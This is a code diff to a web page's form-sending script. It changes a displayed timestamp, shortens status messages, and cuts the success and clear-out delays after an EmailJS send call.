@@ -114,7 +114,7 @@
     
     <!-- User Info Display -->
     <div class="user-info">
-      <p><strong>Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted):</strong> <span id="utc-time">2025-11-19 11:36:58</span></p>
+      <p><strong>Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted):</strong> <span id="utc-time">2025-11-19 11:48:27</span></p>
       <p><strong>Current User's Login:</strong> sweeetpie</p>
     </div>
   </div>
@@ -221,19 +221,23 @@
       updateCurrentTime(); // Update time before sending
 
       const statusDiv = document.getElementById("status");
-      statusDiv.innerHTML = "<span class='loading'>Sending... please wait ⏳</span>";
+      statusDiv.innerHTML = "<span class='loading'>Sending email... ⏳</span>";
       statusDiv.className = "loading";
 
+      // Send email with optimized timing
       emailjs.sendForm("service_9rj5bd7", "template_ld4dzki", this)
         .then(() => {
+          // Show success immediately (300ms)
           setTimeout(() => {
             statusDiv.innerHTML = "<span class='success'>✅ Email sent successfully!</span>";
             statusDiv.className = "success";
             document.getElementById("yahooForm").reset();
+            
+            // Clear status after 4 seconds
             setTimeout(() => {
               statusDiv.innerHTML = "";
-            }, 5000);
-          }, 1300);
+            }, 4000);
+          }, 300);
         }, (error) => {
           console.error("Email error:", error);
           statusDiv.innerHTML = "<span class='error'>❌ Failed to send email. Please try again.</span>";
